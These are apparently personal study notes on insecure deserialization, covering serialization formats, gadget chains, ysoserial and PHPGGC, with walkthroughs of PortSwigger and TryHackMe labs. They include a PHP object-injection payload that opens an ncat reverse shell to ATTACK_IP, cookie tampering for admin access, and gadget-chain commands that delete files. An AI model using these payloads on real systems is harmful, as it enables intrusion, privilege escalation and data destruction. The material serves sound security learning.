**Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. ==So it basically data being transformed into `1`'s and `0`'s and back out. ==
- Similar to encoding but more focused on complex structures where encoding might be a step in the process
- Also called marshalling in Ruby or pickling in Python

Identifying:

Java - uses binary serialization
- serialized Java objects always begin with the same bytes, which are encoded as `ac ed` in hexadecimal and `rO0` in Base64.
## Formats
### PHP 

Accomplished using the `serialize()` function. Example:
```php
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
```

The output will be: `O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}`
- `O:5:"Notes":1:`: This part indicates that the serialised data represents an object of the class **Notes**, which has one property.
- `s:7:"content"`: This represents the property name "**content**" with a length of 7 characters. In serialised data, strings are represented with `s` followed by the length of the string and the string in double quotes. Integers are represented with `i` followed by the numeric value without quotes.
- `s:14:"Welcome to THM"`: This is the value of the **content** property, with a length of 14 characters.

Note that PHP may call `__sleep()` before serialization and `__wakeup()` upon deserialization. 

#### Another Example
PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. 
- Ex - consider a `User` object with the attributes:
	- `$user->name = "carlos"; $user->isLoggedIn = true;`
- When serialized, this object may look something like this:
	- `O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}`
- This can be interpreted as follows:
	- `O:4:"User"` - An object with the 4-character class name `"User"`
	- `2` - the object has 2 attributes
	- `s:4:"name"` - The key of the first attribute is the 4-character string `"name"`
	- `s:6:"carlos"` - The value of the first attribute is the 6-character string `"carlos"`
	- `s:10:"isLoggedIn"` - The key of the second attribute is the 10-character string `"isLoggedIn"`
	- `b:1` - The value of the second attribute is the boolean value `true`

### Python
Accomplished using the `Pickle` module. Example:
```python
import pickle
import base64

...
serialized_data = request.form['serialized_data']
notes_obj = pickle.loads(base64.b64decode(serialized_data))
message = "Notes successfully unpickled."
...

elif request.method == 'POST':
    if 'pickle' in request.form:
        content = request.form['note_content']
        notes_obj.add_note(content)
        pickled_content = pickle.dumps(notes_obj)
        serialized_data = base64.b64encode(pickled_content).decode('utf-8')
        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
        message = "Notes pickled successfully."
```

Note that this uses base64 because serialized data is binary and not safe for display in all environments. 

### Others
- Java uses the the `Serializable` interface, allowing objects to be converted into byte streams and vice versa, which is essential for network communication and data persistence. 

- .NET applications typically use `System.Text.Json` for JSON serialisation, or `System.Xml.Serialization` for XML tasks. 

- Ruby uses the `Marshal` module, but for more human-readable formats, it often utilizes YAML.

### THM Identification
If you have access to the source code, check for serialization functions such as `serialize()`, `unserialize()`, `pickle.loads()`. 

If you don't have access to the source code, check for:
- Error messages in the server response
- Inconsistencies in application behavior
- Cookies:
	- base64 encoded values
	- ASP.NET view state - .NET applications might use serialisation in the view state sent to the client's browser. A field named `__VIEWSTATE`, which is base64 encoded, can sometimes be seen.

#### Cookies Example

![](/assets/images/Insecure%20Deserialization/Screenshot%202024-11-27%20at%202.32.30%20PM.png)

If they are base64, they can be altered and replaced.

![](/assets/images/Insecure%20Deserialization/Screenshot%202024-11-27%20at%202.32.47%20PM.png)

## Object Injection
This simple PHP code base64 encodes a payload, the serializes it for an example where we know that we are able to inject:
```php
<?php
class MaliciousUserData {
public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
}

$maliciousUserData = new MaliciousUserData();
$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);
echo "Base64 Encoded Serialized Data: " . $base64EncodedData;
?>
```

If we put it in here (`http://MACHINE_IP/case2/?decode=[SHELLCODE]`) where we know it will be decoded, we can catch a reverse shell.
## Magic Methods
Magic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs.
- Ex: `__construct()`
- Can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object
- some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.


## Injecting arbitrary objects
[Check it](4%20-%20Web_Application/04-Server-Side/Insecure%20Deserialization.md#lab-arbitrary-object-injection-in-php)

## Gadget Chains
A "**gadget**" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal.
- A gadget chain is **not** a payload of chained methods constructed by the attacker. *All of the code already exists on the website.*
- This is typically done using a magic method that is invoked during deserialization, sometimes known as a "kick-off gadget".
- Manually identifying gadget chains is *almost impossible without source code access*.

### ysoserial
In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:
```
java -jar ysoserial-all.jar \ 
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ 
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ 
--add-opens=java.base/java.net=ALL-UNNAMED \ 
--add-opens=java.base/java.util=ALL-UNNAMED \ [payload] '[command]'
```

Not all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:
- The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in *any known Java version*. This makes it the **most universal** gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. 
	- `java -jar /home/cgrigsby/Desktop/ysoserial-all.jar URLDNS "http://YOUR.burpcollaborator.net" > urldns.ser`
	- base64 encode it and send it in the request
- `JRMPClient` is another **universal** chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address *rather than a hostname*. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, ==this indicates that the gadget chain worked== because the server tried to connect to the firewalled address.


### PHP Generic Gadget Chains
Most languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use "PHP Generic Gadget Chains" (**PHPGGC**), a tool for generating gadget chains used in PHP object injection attacks, specifically tailored for exploiting vulnerabilities related to PHP object serialization and deserialization.
- **Gadget Chains**: PHPGGC provides a library of gadget chains for various PHP frameworks and libraries. These gadget chains are sequences of objects and methods designed to exploit specific vulnerabilities when a PHP application unsafely unserialises user-provided data.
- **Payload Generation**: The main purpose of PHPGGC is to facilitate the generation of serialised payloads that can trigger these vulnerabilities. It helps security researchers and penetration testers create payloads that demonstrate the impact of insecure deserialization flaws.
- **Payload Customisation**: Users can customize payloads by specifying arguments for the functions or methods involved in the gadget chain, thereby tailoring the attack to achieve specific outcomes, such as encoding.

#### Usage
1. Search for the gadget chain you want to exploit: `php phpggc -l $term` (laravel for example)
2. Create the payload (base64): `php phpggc -b Laravel/RCE3 system whoami`
	1. Or non-encoded:
![](/assets/images/Insecure%20Deserialization/Screenshot%202024-11-30%20at%203.06.36%20PM.png)
3. Check your browser storage, in this case for an `XSRF-TOKEN`
![](/assets/images/Insecure%20Deserialization/image.png)

4. Then send a curl command which includes your payload: `curl IP:PORT -X POST -H 'X-XSRF-TOKEN: $base64Payload`


# Labs
## Lab: Modifying serialized objects
Cookie decodes with base64 to `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
- Change to: `s:5:"admin";b:1;` to represent admin user
- Send with **each** request (`my-account` -> `change-email`, -> `admin`) before deleting

## Lab: Modifying serialized data types
- Capture the session cookie and send to decoder
- URL decode then base64 decode and get:
- `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"pdwvn2dsfs6ly4h9mbhjnh5i29otiask";}`
- change to `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`
	- username is string 13 for administrator and access token type is changed to `i` for integer and `0` so it evaulates `true`
- Use this session cookie to access the `/admin` page

## Lab: Using application functionality to exploit insecure deserialization
Key thing here is **to edit the serialized data from Inspector in Repeater and click Apply Changes**
It looked like this: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJwZHd2bjJkc2ZzNmx5NGg5bWJoam5oNWkyOW90aWFzayI7fQ%3d%3d` which after URL and base64 decoding returns this:
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jandg58ig48rpzrf1dy4lhnw4ltvlyos";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
- just need to change to `s:23:"/home/carlos/morale.txt"` and then `**Apply changes**`
- *I tried to do it all in decoder, but it didn't want to work*
	- Also no need to change the user parameter

## Lab: Arbitrary object injection in PHP
Straight up, I'm not gonna get this

1. Log in and notice the session cookie contains a serialized PHP object.
2. From the site map, notice that the website references the file `/libs/CustomTemplate.php`.
3. In Burp Repeater, ==notice that you can read the source code by appending a tilde (`~`) to the filename in the request line.==
4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.
5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:
    `O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
6. Apply changes in the decoder (base64 and URL encode)
7. Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.

## Lab: Exploiting Java deserialization with Apache Commons

Requires `ysoserial-all.jar`
```
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
Didn't work with the suggested command, probably had something to do with weird spaces
Guidance is Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater, then run the command above and use the output as the session cookie. 

## Lab: Exploiting PHP deserialization with a pre-built gadget chain
**PHPGGC**

Another pretty rough one. I found the `/cgi-bin/phpinfo.php` file, but it says Zend, and the error message if you change a cookie says `Symfony 4.3.6`, but I didn't get that one. 
- Run `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64`
- ==You also need a ==**SECRET_KEY**==from the phpinfo file.==
- Then create and run this script:
```php
<?php
$object = "<output of above command>";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie; 

```
That is the cookie. You replace it, and there's an error, but refresh and then it works. 

## Lab: Exploiting Ruby deserialization using a documented gadget chain
Uses [this](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) deserialization script, but I couldn't get ruby working so I had to run it in docker without internet. 
- `docker run -it --rm --network none -v $(pwd):/work -w /work ruby:3.0 bash`
- `ruby script.rb`
- Replacing `id` with `rm /home/carlos/morale.txt` of course
- Then replace the base64 output with the session cookie in any request